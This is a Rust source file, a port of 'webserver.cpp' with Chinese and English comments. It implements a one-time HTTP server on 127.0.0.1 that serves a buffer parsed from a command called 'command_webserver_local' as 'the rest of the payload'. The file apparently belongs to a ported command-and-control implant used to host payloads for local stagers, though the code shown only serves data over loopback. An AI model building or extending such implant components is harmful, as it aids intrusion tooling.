//! webserver.cpp 的移植版 — 一次性的本地 HTTP 服务器。
//! Port of webserver.cpp — a one time use local HTTP server.

use crate::channel_tcp::channel_winsock_init;
use crate::parse::DataP;
use crate::state::THREAD_COUNT;
use crate::thread::run_thread_start;
use std::sync::atomic::Ordering;
use windows_sys::Win32::Networking::WinSock::*;

/// 每个请求的服务器状态（serverdata）。
/// Per-request server state (serverdata).
struct ServerData {
    socket: SOCKET,
    length: i32,
    hlength: i32,
    data: Vec<u8>,
    header: Vec<u8>,
    getit: Vec<u8>,
}

/// 构建服务器数据包（serverdata_build）。
/// Build the server package (serverdata_build).
fn serverdata_build(socket: SOCKET, data: &[u8], length: i32) -> ServerData {
    // 将我们的数据推入这个服务器数据包
    // push our data into this server package
    let data = data[..length as usize].to_vec();

    // 同时分配我们的头信息
    // allocate our header info too
    let header = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
        length
    )
    .into_bytes();
    let hlength = header.len() as i32;

    // 分配我们的临时缓冲区
    // allocate our temporary buffer
    ServerData {
        socket,
        length,
        hlength,
        data,
        header,
        getit: vec![0u8; 2048],
    }
}

/// 读取一些内容（recv_line）：读取一行以 CRLF 结尾的行。
/// Grab some stuff (recv_line): read one CRLF-terminated line.
fn recv_line(my_sock: SOCKET, buffer: &mut [u8], max: usize) -> i32 {
    let mut read = 0usize;
    unsafe {
        while read < max {
            let status = recv(my_sock, buffer[read..].as_mut_ptr(), 1, 0);
            if status <= 0 {
                return SOCKET_ERROR;
            }

            // 应该只有 1 个字节
            // should be 1 byte
            read += status as usize;

            // 我们准备好了 y0
            // we're good to go y0
            if read >= 2 && buffer[read - 1] == b'\n' && buffer[read - 2] == b'\r' {
                buffer[read - 2] = 0;
                return read as i32;
            }
        }
    }
    SOCKET_ERROR
}

/// 服务单个连接（serveit_thread）。
/// Serve a single connection (serveit_thread).
fn serveit_thread(mut sdata: ServerData) {
    unsafe {
        // 接受连接
        // accept the connection
        let client_sock = accept(sdata.socket, std::ptr::null_mut(), std::ptr::null_mut());

        if client_sock == INVALID_SOCKET {
            closesocket(sdata.socket);
            THREAD_COUNT.fetch_sub(1, Ordering::SeqCst);
            return;
        }

        // 读取一些请求数据
        // get some stuff
        while recv_line(client_sock, &mut sdata.getit, 2048) > 2 {
            // 继续读取！
            // keep reading!
        }

        // 发送它
        // send it
        send(client_sock, sdata.header.as_ptr(), sdata.hlength, 0);
        send(client_sock, sdata.data.as_ptr(), sdata.length, 0);

        // 清理 y0
        // clean up y0
        closesocket(sdata.socket);
        closesocket(client_sock);

        // 递减我们的线程计数
        // decrement our threadcount
        THREAD_COUNT.fetch_sub(1, Ordering::SeqCst);
    }
}

/// 启动一个一次性的 Web 服务器（serveit）。
/// Spin up a one time use web server (serveit).
pub fn serveit(port: u16, data: &[u8], length: i32) {
    unsafe {
        // 初始化 winsock
        // init winsock
        channel_winsock_init();

        // 设置我们的套接字
        // setup our socket
        let server_sock = socket(AF_INET as i32, SOCK_STREAM, 0);
        if server_sock == INVALID_SOCKET {
            closesocket(server_sock);
            return;
        }

        // 指定我们要绑定的主机/端口
        // specify the host/port we want to bind to
        let mut sock: SOCKADDR_IN = std::mem::zeroed();
        sock.sin_family = AF_INET;
        sock.sin_port = port.to_be(); // htons
        sock.sin_addr.S_un.S_addr = 0x0100_007f; // 127.0.0.1

        // 启动我们的服务器
        // start our server
        let status = bind(
            server_sock,
            &sock as *const SOCKADDR_IN as *const _,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        );
        if status == SOCKET_ERROR {
            closesocket(server_sock);
            return;
        }

        // 监听传入的连接…… *竖起耳朵*
        // listen for a connection... *pHEAR*
        let status = listen(server_sock, 120);
        if status == SOCKET_ERROR {
            closesocket(server_sock);
            return;
        }

        // 创建我们的 serverdata 对象
        // make our serverdata object
        let sdata = serverdata_build(server_sock, data, length);

        run_thread_start(move || serveit_thread(sdata));
    }
}

/// 在指定端口启动本地 Web 服务器，提供剩余 payload 内容。
/// Start a local webserver on the specified port serving the rest of the payload.
pub fn command_webserver_local(buffer: &[u8], length: usize) {
    let mut data = buffer[..length].to_vec();
    let mut parser = DataP::init(&mut data);

    let port = parser.data_short();
    let mydata = parser.data_buffer();
    let mylen = parser.data_length();

    serveit(port, mydata, mylen as i32);
}
